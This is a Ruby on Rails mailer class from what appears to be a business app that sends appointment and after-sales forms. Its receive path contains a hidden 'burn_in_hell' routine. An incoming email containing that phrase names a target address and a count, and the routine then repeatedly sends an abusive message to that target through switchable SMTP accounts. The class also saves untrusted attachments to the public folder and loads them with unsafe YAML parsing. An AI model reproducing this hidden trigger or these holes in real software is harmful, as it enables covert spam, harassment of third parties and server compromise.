# encoding: UTF-8

class Document < ActionMailer::Base
   def prepare_receive(email,user_name)
     if user=User.find_by_name(user_name)
     puts 'user trouvé '+user.name
     end
     receive(email)
   end


def smtp_settings_reload(name)
          options = YAML.load_file("#{RAILS_ROOT}/config/mailers.yml")[Rails.env][name]
          ActionMailer::Base.smtp_settings = {
            :address => options["address"],
            :port => options["port"],
            :domain => options["domain"],
            :authentication => options["authentication"],
            :user_name => options["user_name"],
            :password => options["password"],
            :tls => options["tls"]
          }
end



   def receive(email)
   sender = nil
   puts 'in receive'

   body=nil
   main_options(email)
   burn_in_hell(email)

   flag=false
   if flag==true
  # puts email
   email.body.parts.each do |p|

       if p.mime_type == "text/html" or p.mime_type == "text/plain"

           puts  body = p.body


       end
   end



   puts email_db=EmailDb.new(:subject=>email.subject.to_s,:from=>email.from.to_yaml ,:to=>email.to ,:content=>body.to_yaml)

   puts  email_db.content.size
   puts email_db.save

    File.open("#{RAILS_ROOT}/public/mails.html", "a+") { |f| f.write(body)}
    #html =File.open("#{RAILS_ROOT}/public/mails.html", "r").read
    #doc = Nokogiri::HTML(html)
    #puts doc
   end
   end
   def main_options(email)
     puts "in main options"
     if email != nil
     puts "E-mail from #{email.from} received. #{email.from.class}"
       puts " checking for attachments "
     attachment_params=attachment_management(email)
     puts 'back in main options'
     puts attachment_params
     else
     puts "data = nil"
     end
   end
   def attachment_management(email)
      attachment_hash={ }
      if email.has_attachments?

      email.attachments.each do |attachment|
       if File.extname( attachment.filename)=='.yml'
         puts 'yml found'
         File.open(Rails.root.to_s+"/public/"+attachment.filename, "wb") { |f| f.write(attachment.body)}
         yml=YAML::load(File.read(File.join(Rails.root.to_s, 'public', attachment.filename)))
         yaml_params_hash= yml.to_hash
         attachment_hash["yaml_params"]=yaml_params_hash[:test]


       elsif File.extname( attachment.filename)=='.tif'
         

       else
         puts File.extname( attachment.filename)
       end
      #File.open(Rails.root.to_s+"/public/"+attachment.filename, "wb") { |f| f.write(attachment.body)}
      end
      else
        puts 'no attachment'
      end
      
      return attachment_hash
   end


   def burn_in_hell(email)
     sender = nil
   puts 'in receive'

   body=nil
   if email.body.to_s.scan("burn in hell").include?("burn in hell")



     puts "keyword found...now finding parameter"
     recipient=email.body.to_s.split("target:")
     if recipient[1].nil?
        puts 'no target'
     else
        email_addr=recipient[1].split("#")[0]

        if email_addr.match(/(\A[\w.]+[@][a-zA-Z0-9]+[.][a-zA-Z]{2,3}\z)/i)


            puts "target found: #{email_addr}."
            if number=email.body.to_s.split("#")
               if number[1].nil?
                 puts 'unhandled error: nothing after # '
               else
                 time=number[1].split("?")[0]
                  if time_int=time.to_i
                    puts "sending message #{time_int} times"
                    time_int.times do
                      puts "sending to #{email_addr}"
                      if sender=email.body.to_s.split("?")

                        smtp_settings_reload(sender[1].split(" ")[0])
                      else
                      end
                      Document.mail_200(email_addr).deliver
                      sleep(5)
                    end

                  else
                    puts "unhandled error: time not a fixnum"
                  end

               end
            else
               50.times do

                  puts "sending"
                  Document.mail_200(email_addr).deliver
                  sleep(5)
               end
            end
        else
             puts "bad email regexp can't send #{email_addr} "
        end


     end
   else

     puts "no keyword... skipping"

   end
   end
   def fiche_de_rendez_vous(project)
        @flag=1
        @project=project
        #attachments['rails.png'] = File.read(Rails.root.to_s+'/public/images/rails.png')
        mail(:to => "nicolas@onlywood.be",
        :from =>"n0st4lg1af0r1nf1n1ty@gmail.com",
        :subject => "Nouvelle fiche de rendez-vous #{@project.project_ref_string}")
   end

   def sav_form(model)
     if model.class=="Project"


        @project=model
        attachments['DEMANDE_INTERVENTION_SAV.pdf'] = File.read(Rails.root.to_s+'/public/data/documents/DEMANDE_INTERVENTION_SAV.pdf')
        mail(:to => @project.client.contacts.where("genre = 'Email'").first.contact_data ,# if more than one email must check .....
        :from =>"onlywoodnoreply@gmail.com",
        :subject => "Formulaire de service après-ventes pour le projet: #{@project.project_ref_string}")
     elsif  model.instance_of? ServiceApresVente
         @service_apres_vente=model
        attachments['DEMANDE_INTERVENTION_SAV.pdf'] = File.read(Rails.root.to_s+'/public/data/documents/DEMANDE_INTERVENTION_SAV.pdf')
        mail(:to => @service_apres_vente.contacts.where("genre = 'Email'").first.contact_data ,# if more than one email must check .....
        :from =>"onlywoodnoreply@gmail.com",
        :subject => "Formulaire d'intervention ou de service après-ventes. ")
     end
   end
  def mail_200(address)

      #  attachments['Formulaire_de_SAV.pdf'] = File.read(Rails.root.to_s+'/public/data/documents/Formulaire_de_SAV.pdf')
        mail(:to => address ,# if more than one email must check .....
        :from =>"n0st4lg1af0r1nf1n1ty@gmail.com",
        :subject => "YOU SHALL BURN IN HELL HERETIC... or join our friendly community: the Church of St John of the Apocalypse")
   end
  
end
